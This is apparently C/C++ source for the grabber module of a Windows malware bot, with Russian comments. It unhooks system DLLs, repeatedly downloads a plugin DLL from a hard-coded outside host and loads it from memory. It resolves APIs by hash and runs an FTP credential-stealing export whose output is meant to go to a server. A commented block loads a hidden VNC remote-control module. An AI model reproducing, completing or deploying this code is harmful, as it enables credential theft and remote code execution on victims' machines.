#include <windows.h>

#include "GetApi.h"
#include "Grabber.h"
#include "Loader.h"
#include "DllLoader.h"
#include "Memory.h"
#include "Strings.h"

#include "Crypt.h"
#include "Utils.h"
#include "Unhook.h"
#include "Task.h"
#include "Inject.h"



bool ExecuteGrabber(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	// Запустить поток грабера. Доступна только при включенном модуле грабера
	return TwiceJumpSelf(GrabberThread);
}



DWORD WINAPI GrabberThread( LPVOID lpData )
{

	UnhookDlls();

/*
	char GrabberFile[] = {'X',':','\\', 't','r','a','s','h','\\','c','o','d','e','\\','w','o','r','k','\\' ,'r','f','b','\\','b','r','a','n','c','h','e','s','\\','d','l','l','\\','b','i','n','\\','D','e','b','u','g','\\','x','8','6','.','d','l','l',0};
    ///if ( BotModule != NULL  )
	{
		typedef void ( WINAPI *PVNC_Start )();

		HANDLE hFile=CreateFile(GrabberFile,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
		DWORD dwSize=GetFileSize(hFile,0);

		LPVOID BotModule = MemAlloc(dwSize);
		pReadFile(hFile,BotModule,dwSize,&dwSize,0);
		pCloseHandle(hFile);

		HMEMORYMODULE hLib = MemoryLoadLibrary( BotModule );

		if ( hLib == NULL )
		{
			return 0;
		}

		PVNC_Start VNC_Start	 = (PVNC_Start)MemoryGetProcAddress( hLib, "_VNC_Start@0" );

///PVNC_Start VNC_Start	 = (PVNC_Start)GetProcAddress(LoadLibrary(GrabberFile),"_VNC_Start@0");

		VNC_Start();
		while (true) pSleep(1);


		MemoryFreeLibrary( hLib );
		MemFree( BotModule );
		return 1;
	}
	*/
//link.txt
//


	char GrabberFile[] = {"http://apartman-adriana.com/temp/DrClient.dll"/*'/','g','r','a','b','e','r','.','d','l','l',0*/};

	LPVOID BotModule = NULL;

	bool bKnock = false;

	while ( ( BotModule = DownloadPluginFromPath(GrabberFile, NULL ) ) == NULL )
	{
		pSleep( 1000 * 60 * 5 );
	}

	if ( BotModule != NULL  )
	{
		HMEMORYMODULE hLib = MemoryLoadLibrary( BotModule );

		if ( hLib == NULL )
		{
			return 0;
		}

		typedef char * ( WINAPI *PFTPGRAB )();

		char GrabFTP[] = {'S','c','a','n','1', 0 };
		char Ole32[]   = {'o','l','e','3','2','.','d','l','l', 0};

		typedef void ( WINAPI *PCoUninitialize )();
		typedef HRESULT ( WINAPI *PCoInitialize )( LPVOID lpReserved );

		PCoUninitialize pCoUninitialize_ = (PCoUninitialize)GetProcAddressEx( Ole32, 0, 0xEDB3159D );
		PCoInitialize   pCoInitialize_   = (PCoInitialize)GetProcAddressEx( Ole32, 0, 0xF341D5CF );

		pCoUninitialize_();
		pCoInitialize_( NULL );

		PFTPGRAB FtpGrabber	 = (PFTPGRAB)MemoryGetProcAddress( hLib, GrabFTP );

		char *Buffer = FtpGrabber();

		DWORD dwSize = m_lstrlen( Buffer );

		if ( dwSize != 0 )
		{
			Buffer[ dwSize ] = '\0';

			bool Sended = false;
			do
			{
				// Отправляем данные на сервер

				Sended = true;
				if (!Sended)
					pSleep( 1000 );

			}
			while (!Sended);
		}

		MemoryFreeLibrary( hLib );

		MemFree( Buffer );
		MemFree( BotModule );


	}

//	pExitProcess( 1 );

	return 0;
}

